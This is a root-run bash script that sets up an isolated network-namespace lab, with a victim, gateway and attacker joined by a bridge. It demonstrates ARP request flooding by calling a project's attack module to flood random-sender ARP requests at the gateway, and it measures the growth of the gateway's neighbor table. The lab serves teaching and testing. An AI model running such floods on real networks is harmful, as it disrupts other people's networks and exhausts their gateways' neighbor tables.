#!/usr/bin/env bash
# Isolated ARP request flooding lab (Linux only, needs root).
#
# Topology, all inside network namespaces, one Linux bridge as the switch:
#
#   victim --(veth)-- [switch: br0] --(veth)-- gateway   (10.95.0.1)
#                           |
#                           +--(veth)-- attacker
#
#   Phase 1: the gateway's neighbor table holds the entries from the victim's ping.
#   Phase 2: the attacker floods the segment with ARP requests from random senders
#   in 10.95.0.0/24, all asking for the gateway's IP. Every broadcast reaches the
#   victim, and the gateway answers each sender, so its neighbor table grows.
#
# Nothing here touches the host's real network interfaces.
#
# Usage:
#   sudo scripts/lab/arp_request_flooding_lab.sh
#   sudo FRAMES=300 scripts/lab/arp_request_flooding_lab.sh
#
# Requirements: iproute2 (ip, bridge), ping, and the project virtualenv (.venv).
# Override the interpreter with PYTHON=/path/to/python.

set -euo pipefail

if [[ "$(id -u)" -ne 0 ]]; then
    echo "This lab needs root: run it with sudo." >&2
    exit 1
fi

for tool in ip bridge ping; do
    if ! command -v "$tool" >/dev/null 2>&1; then
        echo "Missing required tool: $tool" >&2
        exit 1
    fi
done

ROOT="$(cd "$(dirname "$0")/../.." && pwd)"
PY="${PYTHON:-$ROOT/.venv/bin/python}"
FRAMES="${FRAMES:-200}"
SNIFF_SECONDS=10
SUBNET="10.95.0.0/24"
GATEWAY_IP="10.95.0.1"
VICTIM_IP="10.95.0.10"
GATEWAY_MAC="02:00:00:00:00:01"
VICTIM_MAC="02:00:00:00:00:10"
ATTACKER_MAC="02:00:00:00:00:30"
WORK="$(mktemp -d)"

stop_lab() {
    for ns in victim gateway attacker switch; do
        ip netns del "$ns" 2>/dev/null || true
    done
}

cleanup() {
    stop_lab
    rm -rf "$WORK"
}
trap cleanup EXIT

# Remove leftovers from a previous interrupted run.
stop_lab

ip netns add switch
ip netns add victim
ip netns add gateway
ip netns add attacker

ip link add v-sw type veth peer name sw-v
ip link set v-sw netns victim
ip link set sw-v netns switch

ip link add g-sw type veth peer name sw-g
ip link set g-sw netns gateway
ip link set sw-g netns switch

ip link add a-sw type veth peer name sw-a
ip link set a-sw netns attacker
ip link set sw-a netns switch

ip netns exec switch ip link add br0 type bridge
ip netns exec switch ip link set br0 up
for port in sw-v sw-g sw-a; do
    ip netns exec switch ip link set "$port" master br0
    ip netns exec switch ip link set "$port" up
done

ip netns exec victim ip link set v-sw address "$VICTIM_MAC"
ip netns exec victim ip addr add "$VICTIM_IP/24" dev v-sw
ip netns exec victim ip link set v-sw up
ip netns exec gateway ip link set g-sw address "$GATEWAY_MAC"
ip netns exec gateway ip addr add "$GATEWAY_IP/24" dev g-sw
ip netns exec gateway ip link set g-sw up
ip netns exec attacker ip link set a-sw address "$ATTACKER_MAC"
ip netns exec attacker ip link set a-sw up

# Number of neighbor entries in the gateway's table on g-sw.
gateway_neighbors() {
    ip netns exec gateway ip neigh show dev g-sw | grep -c . || true
}

# Counts ARP requests received by the victim during the flood.
SNIFFER_CODE='
import os
from scapy.all import ARP, sniff
count = 0
def cb(pkt):
    global count
    # Skip the requests of the gateway and of the victim; count only the flood.
    if ARP in pkt and pkt[ARP].op == 1 and pkt[ARP].hwsrc not in (os.environ["GATEWAY_MAC"], os.environ["VICTIM_MAC"]):
        count += 1
sniff(iface="v-sw", prn=cb, timeout=int(os.environ["SNIFF_SECONDS"]), store=False)
open(os.environ["OUT"], "w").write(str(count))
'

FLOOD_CODE='
import os, threading
from macabre.attacks.arp_request_flooding import ArpRequestFloodingConfig, run_arp_request_flooding
stats = run_arp_request_flooding(
    ArpRequestFloodingConfig(
        iface="a-sw",
        subnet=os.environ["SUBNET"],
        target_ip=os.environ["GATEWAY_IP"],
        count=int(os.environ["FRAMES"]),
        interval=0.0,
    ),
    threading.Event(),
    lambda _: None,
)
print(f"Attacker: sent {stats.frames} ARP requests")
'

# --- Phase 1: baseline -----------------------------------------------------

echo "Phase 1: the victim pings the gateway, so the gateway learns the victim"
ip netns exec victim ping -c 2 -W 1 "$GATEWAY_IP" >/dev/null
echo "  gateway neighbor entries: $(gateway_neighbors)"
echo

# --- Phase 2: flood --------------------------------------------------------

echo "Phase 2: attacker floods $FRAMES ARP requests for $GATEWAY_IP from random senders in $SUBNET"
ip netns exec victim env PYTHONPATH="$ROOT/src" SNIFF_SECONDS="$SNIFF_SECONDS" OUT="$WORK/victim" \
    GATEWAY_MAC="$GATEWAY_MAC" VICTIM_MAC="$VICTIM_MAC" \
    "$PY" -c "$SNIFFER_CODE" &
sleep 2
ip netns exec attacker env PYTHONPATH="$ROOT/src" SUBNET="$SUBNET" GATEWAY_IP="$GATEWAY_IP" \
    FRAMES="$FRAMES" "$PY" -c "$FLOOD_CODE"
wait

echo "  requests received by the victim: $(cat "$WORK/victim") of $FRAMES"
echo "  gateway neighbor entries:       $(gateway_neighbors)"
echo "  (the table holds distinct sender IPs: $FRAMES random picks from 254 hosts repeat some)"
echo
echo "Expected: the victim receives the broadcast requests, and the gateway's neighbor"
echo "table grows with the random senders it answered."
